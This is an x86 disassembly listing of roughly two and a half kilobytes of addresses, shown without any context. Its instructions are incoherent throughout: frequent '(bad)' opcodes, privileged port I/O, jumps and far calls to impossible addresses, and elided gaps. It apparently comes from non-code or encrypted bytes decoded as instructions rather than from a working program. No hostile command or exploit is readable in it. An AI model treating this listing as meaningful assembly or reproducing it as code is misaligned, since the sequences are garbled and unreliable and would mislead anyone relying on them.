  4173dd:	mov    edi,0x6508016b
  4173e2:	ins    DWORD PTR es:[edi],dx
  4173e3:	pop    ebp
  4173e4:	test   BYTE PTR [ebp+0xfa67],dl
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ef:	sbb    al,0xee
  4173f1:	rcl    DWORD PTR [ebp+0x78],0x2b
  4173f5:	dec    ebx
  4173f6:	jne    0x417436
  4173f8:	jg     0x417425
  4173fa:	dec    esi
  4173fb:	in     al,0xeb
  4173fd:	jo     0x4173e5
  4173ff:	es xchg ebp,eax
  417401:	sbb    bh,BYTE PTR [esi]
  417403:	and    al,BYTE PTR [edi-0x61]
  417406:	popa   
  417407:	push   0xffffffdf
  417409:	imul   esp,DWORD PTR [esi],0xffffffcf
  41740c:	pop    edx
  41740d:	push   ds
  41740e:	(bad)  
  41740f:	sbb    DWORD PTR [ebp-0x3353c704],0x251d863f
  417419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41741a:	fwait
  41741b:	leave  
  41741c:	xor    edx,0xffffff99
  41741f:	jl     0x4173d7
  417421:	cmp    edx,esi
  417423:	int    0x8
  417425:	out    dx,al
  417426:	xchg   esp,eax
  417427:	and    DWORD PTR [ebp*2+0x7a3c35c0],eax
  41742e:	popa   
  41742f:	ins    DWORD PTR es:[edi],dx
  417430:	(bad)
  417434:	pop    edx
  417435:	call   0x8646:0xe51305aa
  41743c:	fistp  WORD PTR [esp+esi*2-0x57983de6]
  417443:	cmp    al,0xc0
  417445:	into   
  417446:	add    eax,0x493ddd99
  41744b:	xchg   ebx,eax
  41744c:	jmp    0xa6c48227
  417451:	xor    bh,BYTE PTR ds:0xb172b1ee
  417457:	ret    0x391e
  41745a:	adc    esi,DWORD PTR [ebx]
  41745c:	mov    WORD PTR [ebp+0x487f4317],cs
  417462:	dec    edi
  417463:	dec    ebx
  417464:	enter  0x1ae2,0x4b
  417468:	xlat   BYTE PTR ds:[ebx]
  417469:	lahf   
  41746a:	push   esp
  41746b:	mov    edx,esp
  41746d:	popf   
  41746e:	out    dx,al
  41746f:	sbb    eax,DWORD PTR [esi+0x6a]
  417472:	scas   eax,DWORD PTR es:[edi]
  417473:	sub    DWORD PTR [esi],ebp
  417475:	stos   BYTE PTR es:[edi],al
  417476:	mov    ebp,0xd0f030a6
  41747b:	fcom   QWORD PTR [ecx+0x37]
  41747e:	sahf   
  41747f:	sbb    ch,BYTE PTR [eax]
  417481:	ds xchg cl,dl
  417484:	and    ch,ch
  417486:	jmp    0xe01b67e0
  41748b:	loop   0x4174e8
  41748d:	mov    dh,0x69
  41748f:	in     eax,0x17
  417491:	fwait
  417492:	xlat   BYTE PTR ds:[ebx]
  417493:	push   eax
  417494:	and    eax,0x198b7c9b
  417499:	shl    esi,cl
  41749b:	(bad)  [esi+0x2d3f9874]
  4174a1:	fild   DWORD PTR [ebx-0x5a]
  4174a4:	test   edi,0xcabdecb7
  4174aa:	dec    eax
  4174ab:	xlat   BYTE PTR ds:[ebx]
  4174ac:	add    BYTE PTR [ecx+ecx*1],dh
  4174af:	or     cl,ch
  4174b1:	clc    
  4174b2:	xlat   BYTE PTR ds:[ebx]
  4174b3:	pop    esp
  4174b4:	pop    esp
  4174b5:	pop    edi
  4174b6:	adc    DWORD PTR [edi],ebx
  4174b8:	ins    DWORD PTR es:[edi],dx
  4174b9:	(bad)  
  4174ba:	addr16 in al,0xbd
  4174bd:	int    0x2c
  4174bf:	ror    DWORD PTR [edx],1
  4174c1:	mov    ah,0x1e
  4174c3:	sbb    eax,0xc219650b
  4174c8:	cmp    ecx,DWORD PTR [esi]
  4174ca:	(bad)  
  4174cb:	in     al,dx
  4174cc:	in     al,dx
  4174cd:	adc    al,0xca
  4174cf:	out    dx,al
  4174d0:	mov    WORD PTR [ebx+edi*2],?
  4174d3:	add    DWORD PTR [esi-0x53],ecx
  4174d6:	mov    eax,0xc38a6311
  4174db:	aam    0xe6
  4174dd:	cmc    
  4174de:	sbb    edx,ebp
  4174e0:	sbb    edx,ebx
  4174e2:	mov    dh,0x69
  4174e4:	mov    ah,0x3f
  4174e6:	and    DWORD PTR [ebx-0x5028182],eax
  4174ec:	xchg   ecx,eax
  4174ed:	mov    ch,0x0
	...
  417553:	add    BYTE PTR [eax],al
  417555:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41755b:	fdivr  st(7),st
  41755d:	mov    edi,0x212a686b
  417562:	xchg   ecx,eax
  417563:	jns    0x417552
  417565:	sahf   
  417566:	addr16 sti 
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	lea    ebp,[esi]
  417570:	nop
  417571:	jmp    0x4174f7
  417573:	push   ds
  417574:	loop   0x4175ef
  417576:	cmp    eax,0x342a183b
  41757b:	out    0xd0,al
  41757d:	daa    
  41757e:	dec    ebp
  41757f:	pop    ecx
  417580:	sub    cl,BYTE PTR [edi-0x5514aacb]
  417586:	jnp    0x41758f
  417588:	psllw  mm2,QWORD PTR [ebx+ebp*4+0x1e]
  41758d:	iret   
  41758e:	loop   0x4175ce
  417590:	mov    esp,0xdc5842ab
  417595:	nop
  417596:	out    dx,al
  417597:	aad    0x7f
  417599:	shl    DWORD PTR [ecx],0xdb
  41759c:	loope  0x4175c3
  41759e:	and    BYTE PTR [edx+esi*4+0x3b051cb6],0x9
  4175a6:	mov    dh,0x23
  4175a8:	xchg   ecx,eax
  4175a9:	lahf   
  4175aa:	test   BYTE PTR [edx+0x53],0x12
  4175ae:	xor    bl,BYTE PTR [esp+ebx*2+0x35558fed]
  4175b5:	inc    esi
  4175b6:	cmp    ch,BYTE PTR [ebp-0x75f88a6]
  4175bc:	in     eax,dx
  4175bd:	popf   
  4175be:	add    BYTE PTR [edx],bh
  4175c0:	pop    eax
  4175c1:	loope  0x417582
  4175c3:	pop    eax
  4175c4:	(bad)  
  4175c5:	loopne 0x417574
  4175c7:	sahf   
  4175c8:	les    eax,FWORD PTR [esi-0x11]
  4175cb:	cwde   
  4175cc:	mov    esi,0x33e66d53
  4175d1:	cmp    eax,0x927669a3
  4175d6:	mov    ebx,0xe71afb08
  4175db:	xor    ecx,DWORD PTR [ebp-0x248aa665]
  4175e1:	xchg   esp,eax
  4175e2:	and    al,0xf5
  4175e4:	pushf  
  4175e5:	in     eax,dx
  4175e6:	mov    bh,0xb6
  4175e8:	jge    0x4175e5
  4175ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175eb:	ins    BYTE PTR es:[edi],dx
  4175ec:	sbb    ebx,DWORD PTR [ecx+ebx*4+0x834a64f]
  4175f3:	xchg   ebx,eax
  4175f4:	and    bh,al
  4175f6:	cmp    BYTE PTR [eax-0x70],bl
  4175f9:	jne    0x4175a9
  4175fb:	jno    0x417672
  4175fd:	mov    ah,0xfe
  4175ff:	mov    ebx,0x1a851162
  417604:	(bad)  
  417605:	jne    0x417671
  417607:	and    eax,ebp
  417609:	(bad)  
  41760a:	sub    BYTE PTR [edx+0x3d4f51cb],bl
  417610:	inc    edi
  417611:	sbb    BYTE PTR [ecx+edi*2-0x1f],0x8b
  417616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417617:	cld    
  417618:	jb     0x41767d
  41761a:	xor    eax,0x670f7281
  41761f:	repnz cmp DWORD PTR [esi+0x1c],edx
  417623:	adc    eax,0x49a0e20e
  417628:	mov    dl,BYTE PTR [eax+0x705dfce5]
  41762e:	rcr    BYTE PTR [edi+eax*4],cl
  417631:	mov    ds:0xf576bdea,al
  417636:	inc    ecx
  417637:	or     esp,DWORD PTR cs:[edi-0x2]
  41763b:	adc    al,0x6b
  41763d:	push   ss
  41763e:	aaa    
  41763f:	add    eax,0xc449fbc2
  417644:	clc    
  417645:	in     al,dx
  417646:	rol    DWORD PTR [ecx],0x52
  417649:	retf   0xbf45
  41764c:	das    
  41764d:	mov    bl,0x90
  41764f:	in     al,0x20
  417651:	push   0xd35c1cb5
  417656:	or     eax,0x94ed2088
  41765b:	dec    ebp
  41765c:	sbb    al,BYTE PTR [edx+0x4c]
  41765f:	out    dx,al
  417660:	jecxz  0x4176c0
  417662:	adc    al,0xa5
  417664:	mov    edx,0x85136ad4
  417669:	(bad)  
  41766a:	xor    edi,DWORD PTR [edi+0x77]
  41766d:	rol    DWORD PTR [eax],cl
	...
  4176d3:	add    BYTE PTR [eax],al
  4176d5:	add    BYTE PTR [ecx-0x20b02c99],ch
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fisub  DWORD PTR [esi]
  4176e3:	and    eax,0xfc67e435
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	arpl   di,di
  4176f0:	ja     0x417680
  4176f2:	dec    esp
  4176f3:	sub    DWORD PTR [ecx+0x61],ebp
  4176f6:	pcmpeqw mm2,QWORD PTR [edi]
  4176f9:	mov    BYTE PTR [ebp+0x55],dl
  4176fc:	or     dl,ch
  4176fe:	dec    edx
  4176ff:	fisub  DWORD PTR [edx]
  417701:	fldcw  WORD PTR [edx-0x1b4d235c]
  417707:	cmp    DWORD PTR [ebp-0x6ab447f8],esp
  41770d:	xchg   edi,eax
  41770e:	push   ds
  41770f:	loopne 0x4176b4
  417711:	icebp  
  417712:	jecxz  0x41772b
  417714:	cdq    
  417715:	and    dl,BYTE PTR [ebx+esi*8-0x6103913a]
  41771c:	jecxz  0x417713
  41771e:	xor    eax,0x277d6bd6
  417723:	or     esp,ebx
  417725:	and    BYTE PTR [esp+ebp*2-0x3d],0xd8
  41772a:	outs   dx,DWORD PTR ds:[esi]
  41772b:	pop    ss
  41772c:	sub    DWORD PTR [ecx],0x6c9ee5d2
  417732:	out    0x2,eax
  417734:	cmp    eax,0x8c149a0b
  417739:	imul   ecx,DWORD PTR [ebp+esi*1-0x60],0x30cecf6c
  417741:	in     eax,dx
  417742:	(bad)  
  417743:	das    
  417744:	adc    eax,0x2e76ca36
  417749:	call   0x782b4290
  41774e:	or     DWORD PTR [eax+0x5ae06a1d],edi
  417754:	jne    0x4176f8
  417756:	pop    eax
  417757:	fmul   QWORD PTR [ecx+eiz*8+0x4c]
  41775b:	mov    edi,0x28a16d8e
  417760:	addr16 inc ecx
  417762:	(bad)  
  417763:	outs   dx,BYTE PTR ds:[esi]
  417764:	push   cs
  417765:	push   ds
  417766:	sub    bh,BYTE PTR [edi]
  417768:	loope  0x4177e1
  41776a:	sub    ebp,DWORD PTR [ebp+0x201c2424]
  417770:	xchg   esi,eax
  417771:	push   cs
  417772:	inc    esi
  417773:	mov    ebp,DWORD PTR [ebx+eax*2-0x4a72794]
  41777a:	push   edx
  41777b:	cmp    al,0x7
  41777d:	out    dx,eax
  41777e:	test   eax,0xc789dcc0
  417783:	jno    0x4177f7
  417785:	mov    ch,0x18
  417787:	push   ebp
  417788:	pusha  
  417789:	out    dx,al
  41778a:	push   0x33a8a4de
  41778f:	push   ss
  417790:	mov    esp,0x7603c0c9
  417795:	fistp  QWORD PTR [eax+0x192e482c]
  41779b:	arpl   WORD PTR [eax+0x1b327fc],dx
  4177a1:	sub    ebx,DWORD PTR ds:0x592b11a8
  4177a7:	js     0x41778d
  4177a9:	outs   dx,BYTE PTR ds:[esi]
  4177aa:	pop    ds
  4177ab:	add    BYTE PTR [edi],cl
  4177ad:	push   cs
  4177ae:	popa   
  4177af:	test   ecx,esp
  4177b1:	and    edi,ecx
  4177b3:	cwde   
  4177b4:	jne    0x417769
  4177b6:	and    dl,BYTE PTR [edx]
  4177b8:	ret    
  4177b9:	mov    dl,0x2c
  4177bb:	das    
  4177bc:	cli    
  4177bd:	test   eax,0x1124af54
  4177c2:	shl    DWORD PTR [edi-0x3c],cl
  4177c5:	xlat   BYTE PTR ds:[ebx]
  4177c6:	popf   
  4177c7:	rcl    bh,cl
  4177c9:	in     eax,dx
  4177ca:	fmul   st(2),st
  4177cc:	inc    edi
  4177cd:	(bad)  
  4177cf:	loop   0x41777a
  4177d1:	fstp   QWORD PTR [ebx]
  4177d3:	push   es
  4177d4:	adc    DWORD PTR [esi+0x3fa33156],ebx
  4177da:	dec    esp
  4177db:	stos   DWORD PTR es:[edi],eax
  4177dc:	fwait
  4177dd:	loopne 0x417825
  4177df:	std    
  4177e0:	pop    esi
  4177e1:	pop    ebp
  4177e2:	icebp  
  4177e3:	or     DWORD PTR [ebx],esi
  4177e5:	in     eax,0x62
  4177e7:	pop    esp
  4177e8:	nop
  4177e9:	jns    0x4177c2
  4177eb:	outs   dx,BYTE PTR ds:[esi]
  4177ec:	xor    al,BYTE PTR [ecx+0x0]
	...
  417856:	jmp    0xff597669
  41785b:	imul   ecx
  41785d:	(bad)  
  41785e:	lahf   
  41785f:	repnz and dl,dl
  417862:	xor    BYTE PTR [eax-0x50],0x22
  417866:	addr16 std 
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	add    al,0x7a
  417870:	cwde   
  417871:	inc    ebp
  417872:	add    al,BYTE PTR gs:[esi]
  417875:	data16 mov fs,WORD PTR [eax+0xa54ffb5]
  41787c:	or     BYTE PTR [esi],bh
  41787e:	out    0xbd,eax
  417880:	adc    edi,ebp
  417882:	push   esp
  417883:	js     0x4178e9
  417885:	or     esi,ecx
  417887:	mov    BYTE PTR [ecx+0x6a],0x96
  41788b:	sbb    ah,ah
  41788d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41788e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41788f:	sub    DWORD PTR [esi+ebp*2],esp
  417892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417893:	mov    esi,0x7ff95cc9
  417898:	loop   0x41787c
  41789a:	sub    al,0x22
  41789c:	mov    eax,0x99e0821b
  4178a1:	scas   eax,DWORD PTR es:[edi]
  4178a2:	call   DWORD PTR [edi+0x52]
  4178a5:	or     ebp,DWORD PTR [esp+edi*1-0x58]
  4178a9:	pop    edx
  4178aa:	pop    eax
  4178ab:	(bad)  
  4178ac:	push   0x9c43192c
  4178b1:	push   esp
  4178b2:	or     al,0xe0
  4178b4:	mov    bh,0x24
  4178b6:	mov    ch,0x10
  4178b8:	cmp    eax,0xb3ba0928
  4178bd:	rcr    dl,cl
  4178bf:	xchg   esp,eax
  4178c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c1:	cld    
  4178c2:	add    DWORD PTR [eax],0xffffffe3
  4178c5:	sbb    ah,bh
  4178c7:	std    
  4178c8:	or     al,0xe3
  4178ca:	loop   0x417924
  4178cc:	xchg   esi,eax
  4178cd:	xor    BYTE PTR [eax+0x128d4415],ah
  4178d3:	mov    WORD PTR [ebx+0x46],?
  4178d6:	inc    ecx
  4178d7:	inc    ebx
  4178d8:	test   ebp,0x695fc205
  4178de:	adc    al,0xf6
  4178e0:	cmp    eax,0x15b79327
  4178e5:	mov    bh,0xb9
  4178e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178e9:	cmp    DWORD PTR [ebp+edi*8+0x10],esp
  4178ed:	jbe    0x4178a3
  4178ef:	repz daa 
  4178f1:	daa    
  4178f2:	loope  0x41790a
  4178f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178f5:	sub    eax,0xe3f158f6
  4178fa:	(bad)  
  4178fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178fe:	mov    ah,BYTE PTR [ebx-0x6c8b075e]
  417904:	hlt    
  417905:	xchg   edx,eax
  417906:	imul   edx,ecx,0x12
  417909:	out    dx,eax
  41790a:	mov    ds,WORD PTR [ebx+0x36]
  41790d:	loope  0x4178a6
  41790f:	add    dl,BYTE PTR ds:0xaf01
  417914:	mov    ebx,DWORD PTR [edi]
  417916:	pushf  
  417917:	sti    
  417918:	icebp  
  417919:	and    bh,al
  41791b:	into   
  41791c:	pop    es
  41791d:	stos   DWORD PTR es:[edi],eax
  41791e:	fmul   DWORD PTR [ebp-0x510a79f1]
  417924:	cmp    ebp,edx
  417926:	ret    
  417927:	sbb    eax,0xa543dc0a
  41792c:	jno    0x417988
  41792e:	jb     0x4178f5
  417930:	fist   DWORD PTR [esi-0x76c9c846]
  417936:	xchg   DWORD PTR [ebx+0x720c239c],ecx
  41793c:	jnp    0x417919
  41793e:	ins    BYTE PTR es:[edi],dx
  41793f:	adc    al,0xe4
  417941:	ins    BYTE PTR es:[edi],dx
  417942:	xchg   ebp,eax
  417943:	aam    0x93
  417945:	std    
  417946:	out    0xd7,al
  417948:	adc    BYTE PTR [edx+0x54daded0],bl
  41794e:	xchg   edx,eax
  41794f:	mov    ah,0xde
  417951:	sub    BYTE PTR [edx-0x750b7403],0xaa
  417958:	jge    0x41793f
  41795a:	add    BYTE PTR [ebx+0x525c7f53],bh
  417960:	test   BYTE PTR [edi+0x5e],bl
  417963:	cmp    al,0xe2
  417966:	in     eax,0x6c
  417968:	(bad)  
  417969:	fnstsw WORD PTR [eax-0x5b]
  41796c:	mov    ds:0x4e,eax
	...
  4179d5:	add    BYTE PTR [eax+0x41],bl
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	inc    ebx
  4179e3:	jae    0x417971
  4179e5:	frstor [edi-0x2]
  4179e8:	add    BYTE PTR [eax],al
  4179ea:	add    BYTE PTR [ecx],al
  4179ec:	add    BYTE PTR [eax],al
  4179ee:	bound  eax,QWORD PTR [eax]
  4179f0:	cmp    BYTE PTR [eax+0x77368a95],ah
  4179f6:	mov    WORD PTR [ecx+0x1f],fs
  4179f9:	jne    0x417a6f
  4179fb:	or     BYTE PTR [esi+0x43],dh
  4179fe:	push   ecx
  4179ff:	jnp    0x417981
  417a01:	push   0xa1587778
  417a06:	cli    
  417a07:	inc    edi
  417a08:	sbb    al,0x63
  417a0a:	push   ebp
  417a0b:	in     al,0x95
  417a0d:	dec    edi
  417a0e:	(bad)  
  417a0f:	pop    edi
  417a10:	sahf   
  417a11:	or     bl,cl
  417a13:	push   ss
  417a14:	retf   
  417a15:	pop    ss
  417a16:	xchg   esi,eax
  417a17:	pop    ebp
  417a18:	add    eax,DWORD PTR [eax-0x54]
  417a1b:	pushf  
  417a1c:	out    0x86,eax
  417a1e:	and    al,0xa8
  417a20:	mov    ds:0xc521f701,al
  417a25:	stos   DWORD PTR es:[edi],eax
  417a26:	jb     0x417a8e
  417a28:	ret    0x978d
  417a2b:	mov    dl,0x91
  417a2d:	ja     0x417a61
  417a2f:	mov    dl,0x29
  417a31:	adc    ch,BYTE PTR [edi]
  417a33:	dec    ecx
  417a34:	es add eax,0x21493355
  417a3a:	js     0x417a80
  417a3c:	mov    ecx,ebp
  417a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a3f:	cmp    ebx,DWORD PTR [edx]
  417a41:	xchg   ecx,eax
  417a42:	jno    0x417a00
  417a44:	stos   BYTE PTR es:[edi],al
  417a45:	dec    ebp
  417a46:	or     eax,0x3d7f2699
  417a4b:	stos   DWORD PTR es:[edi],eax
  417a4c:	dec    ebx
  417a4d:	ficom  DWORD PTR [esi]
  417a4f:	mov    bl,bl
  417a51:	mov    ds:0xa66da321,eax
  417a56:	xchg   edx,eax
  417a57:	in     al,dx
  417a58:	out    dx,al
  417a59:	int3   
  417a5a:	outs   dx,DWORD PTR ds:[esi]
  417a5b:	outs   dx,BYTE PTR ds:[esi]
  417a5c:	jg     0x417abe
  417a5e:	push   eax
  417a5f:	mov    al,ds:0xb48b2e04
  417a64:	repnz xor eax,0xa6c4cc72
  417a6a:	and    BYTE PTR [ecx],bh
  417a6c:	inc    ebx
  417a6d:	xchg   ebp,eax
  417a6e:	add    al,0xc6
  417a70:	jecxz  0x417a39
  417a72:	inc    esp
  417a73:	push   ds
  417a74:	ror    BYTE PTR [ebx+0x21],0xd4
  417a78:	cmp    edi,DWORD PTR [eax+ecx*2]
  417a7b:	or     bl,BYTE PTR [ebx+0x17]
  417a7e:	mov    dh,0x57
  417a80:	into   
  417a81:	mov    ds:0xdd6db40b,eax
  417a86:	cmc    
  417a87:	xor    al,0xfa
  417a89:	sub    eax,DWORD PTR [ecx-0x35]
  417a8c:	out    dx,al
  417a8d:	push   esp
  417a8e:	push   ebp
  417a8f:	pop    ebx
  417a90:	not    DWORD PTR [ebx]
  417a92:	retf   
  417a93:	or     al,0xf2
  417a95:	and    DWORD PTR [eax+0x76e26f8d],ecx
  417a9b:	push   eax
  417a9c:	sbb    eax,0xe64ef51
  417aa1:	ss ret 0x3894
  417aa5:	jg     0x417a7c
  417aa7:	and    eax,0xdc248538
  417aac:	cld    
  417aad:	fisubr WORD PTR [ecx-0x32]
  417ab0:	xor    eax,esp
  417ab2:	clc    
  417ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ab4:	pop    eax
  417ab5:	inc    esp
  417ab6:	jnp    0x417a72
  417ab8:	sub    al,0x37
  417aba:	test   BYTE PTR [edx+0x67],0xaa
  417abe:	cli    
  417abf:	add    esi,esi
  417ac1:	sub    BYTE PTR [ebp-0x3749d4d9],dl
  417ac7:	cmp    edx,DWORD PTR [edx+0x76cdce18]
  417acd:	adc    eax,0x4165d051
  417ad2:	adc    al,BYTE PTR [eax]
  417ad4:	mov    cl,0x74
  417ad6:	add    DWORD PTR [ebx],0x2e
  417ad9:	pause  
  417adb:	sub    BYTE PTR [edi-0x5ec617f3],bl
  417ae1:	test   eax,0x65da7517
  417ae6:	cmp    esi,DWORD PTR [esi]
  417ae8:	push   ebx
  417ae9:	stos   BYTE PTR es:[edi],al
  417aea:	not    BYTE PTR [ecx+eiz*1-0x5e]
	...
  417b56:	das    
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx-0x132b683e]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    al,al
  417b6f:	jno    0x417bae
  417b71:	jae    0x417bb1
  417b73:	cmp    eax,0xb46088f2
  417b78:	cdq    
  417b79:	xchg   ecx,eax
  417b7a:	fcompp 
  417b7c:	lds    ebp,FWORD PTR [ebp+0x25]
  417b7f:	or     DWORD PTR [edx+0x7d],edx
  417b82:	jmp    0x772f70d6
  417b87:	cwde   
  417b88:	ins    BYTE PTR es:[edi],dx
  417b89:	sbb    ch,BYTE PTR [esi+0x26]
  417b8c:	jns    0x417b96
  417b8e:	jbe    0x417b8b
  417b90:	fidiv  WORD PTR [ecx+ebp*4]
  417b93:	add    cl,BYTE PTR [eax+0x60]
  417b96:	push   edi
  417b97:	lock call 0xb6430f15
  417b9d:	mov    ebp,0x25b5915b
  417ba2:	nop
  417ba3:	cld    
  417ba4:	cs clc 
  417ba6:	repnz inc esp
  417ba8:	(bad)  
  417baa:	call   0x5d64d6d8
  417baf:	aad    0x76
  417bb1:	nop
  417bb2:	stc    
  417bb3:	sbb    BYTE PTR [ebp+0x520a3f65],0xca
  417bba:	hlt    
  417bbb:	mov    al,ds:0xaf23e51a
  417bc0:	push   es
  417bc1:	test   al,0x1a
  417bc3:	es inc ecx
  417bc5:	sbb    eax,0x741da130
  417bca:	and    edx,DWORD PTR [esi-0x260712dd]
  417bd0:	mov    WORD PTR [esi+0x4b1e0483],cs
  417bd6:	dec    edi
  417bd7:	xor    eax,0x61e315da
  417bdc:	jbe    0x417c2b
  417bde:	add    al,0x30
  417be0:	pop    eax
  417be2:	les    edi,FWORD PTR [edi-0x4cc4f3d0]
  417be8:	scas   eax,DWORD PTR es:[edi]
  417be9:	add    eax,0x59d8cba6
  417bee:	xor    al,0xa
  417bf0:	les    edx,FWORD PTR [edx]
  417bf2:	in     eax,dx
  417bf3:	mov    dh,0xd5
  417bf5:	push   es
  417bf6:	push   edi
  417bf7:	inc    ecx
  417bf8:	inc    edi
  417bf9:	retf   
  417bfa:	cmp    bh,BYTE PTR [ebp+0x32]
  417bfd:	sub    edx,DWORD PTR [edi-0x22bd410b]
  417c03:	enter  0xcd9e,0x98
  417c07:	outs   dx,BYTE PTR ds:[esi]
  417c08:	imul   eax,DWORD PTR [eax-0x36793d9d],0xfffffff8
  417c0f:	push   esi
  417c10:	push   ss
  417c11:	add    BYTE PTR [ebx+0x320ca41f],al
  417c17:	cmp    al,0x21
  417c19:	sar    BYTE PTR [esi+0x21145f71],1
  417c1f:	mov    edx,0x7743d621
  417c24:	ror    BYTE PTR [edx+0x3],0xf5
  417c28:	shl    DWORD PTR [edi-0x41e9ed7],0x7
  417c2f:	ins    BYTE PTR es:[edi],dx
  417c30:	mov    BYTE PTR [eax],dh
  417c32:	lock inc edi
  417c34:	cmp    al,BYTE PTR [ebx]
  417c36:	out    0x36,al
  417c38:	mov    cl,BYTE PTR [edi+0x731e8ff1]
  417c3e:	inc    ebp
  417c3f:	(bad)  
  417c40:	test   BYTE PTR [ebx+0x58cf5e54],0xd0
  417c47:	xor    BYTE PTR [edx+ecx*1+0x691e1072],ch
  417c4e:	sahf   
  417c4f:	cmp    al,0x6e
  417c51:	imul   esp,DWORD PTR [ebp+0x17400b8d],0x17
  417c58:	mov    BYTE PTR [edi+0xbc142da],dl
  417c5e:	jmp    0xd2ea307e
  417c63:	pushf  
  417c64:	jb     0x417c92
  417c66:	mov    cs,WORD PTR [ecx-0x28]
  417c69:	daa    
  417c6a:	cmc    
  417c6b:	pop    ebx
  417c6c:	stos   DWORD PTR es:[edi],eax
  417c6d:	ins    DWORD PTR es:[edi],dx
	...
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x72
  417ce3:	cmp    al,0x95
  417ce5:	mov    al,0x67
  417ce7:	add    BYTE PTR [ecx],al
  417ce9:	add    BYTE PTR [eax],al
  417ceb:	add    DWORD PTR [eax],eax
  417ced:	add    BYTE PTR [ecx],ah
  417cef:	fs retf 0xce97
  417cf3:	in     al,dx
  417cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf5:	pop    es
  417cf6:	dec    esp
  417cf7:	xor    eax,0xcc36170e
  417cfc:	(bad)  
  417cfd:	iret   
  417cfe:	lods   eax,DWORD PTR ds:[esi]
  417cff:	jp     0x417d42
  417d01:	and    bh,BYTE PTR [edx]
  417d03:	jp     0x417d7d
  417d05:	jl     0x417d50
  417d07:	sub    DWORD PTR [edx],ecx
  417d09:	adc    eax,0x25e27050
  417d0e:	stos   BYTE PTR es:[edi],al
  417d0f:	test   al,0xeb
  417d11:	mov    ds:0x68ca08cb,eax
  417d16:	push   ecx
  417d17:	adc    BYTE PTR [ecx],ah
  417d19:	xlat   BYTE PTR ds:[ebx]
  417d1a:	in     al,dx
  417d1b:	not    BYTE PTR [ebp-0x80]
  417d1e:	test   eax,0xbb9d0e02
  417d23:	mov    esp,0xd97f27e1
  417d28:	push   edx
  417d29:	xchg   bl,al
  417d2b:	sbb    al,al
  417d2d:	sar    DWORD PTR ds:0x95469f98,1
  417d33:	nop
  417d34:	push   eax
  417d35:	mov    ds,WORD PTR [edi]
  417d37:	sub    eax,0x71559eba
  417d3c:	loop   0x417d07
  417d3e:	sbb    eax,0xf9712b34
  417d43:	mov    bh,BYTE PTR [edx+0x3b]
  417d46:	test   eax,0x5f14d705
  417d4b:	cld    
  417d4c:	retf   0x7398
  417d4f:	enter  0x39cc,0x7a
  417d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d54:	pop    esp
  417d55:	hlt    
  417d56:	cmp    ah,BYTE PTR [edx]
  417d58:	stc    
  417d59:	jle    0x417d0f
  417d5b:	mov    eax,ds:0xf9cfc633
  417d60:	test   esp,ebx
  417d62:	call   0x5ee97996
  417d67:	sahf   
  417d68:	dec    edx
  417d69:	pop    ebx
  417d6a:	(bad)  
  417d6b:	test   ebp,0x5a8fd170
  417d71:	lock xor DWORD PTR [edx],ebp
  417d74:	cmp    DWORD PTR [edx],0x44
  417d77:	adc    eax,0x223f9504
  417d7c:	xchg   BYTE PTR [esi-0x53],ch
  417d7f:	daa    
  417d80:	outs   dx,DWORD PTR ds:[esi]
  417d81:	xchg   ecx,eax
  417d82:	and    BYTE PTR [esi-0x69e17a17],0xf
  417d89:	jmp    0x417d37
  417d8b:	pop    esi
  417d8c:	jl     0x417d6f
  417d8e:	dec    esp
  417d8f:	add    dl,BYTE PTR [ebp-0x72]
  417d92:	shl    DWORD PTR [edx+0x66],1
  417d95:	pop    ds
  417d96:	jno    0x417d68
  417d98:	loope  0x417d8a
  417d9a:	xor    al,0x82
  417d9c:	out    dx,al
  417d9d:	pushf  
  417d9e:	in     eax,dx
  417d9f:	hlt    
  417da0:	dec    esi
  417da1:	and    al,BYTE PTR [ebx-0x4d]
  417da4:	xchg   dh,dh
  417da6:	jno    0x417dfe
  417da8:	push   ecx
  417da9:	(bad)  
  417daa:	nop
  417dab:	inc    ecx
  417dac:	mov    eax,ds:0x8eb33b53
  417db1:	mov    esi,0xa1688081
  417db6:	sub    edx,edi
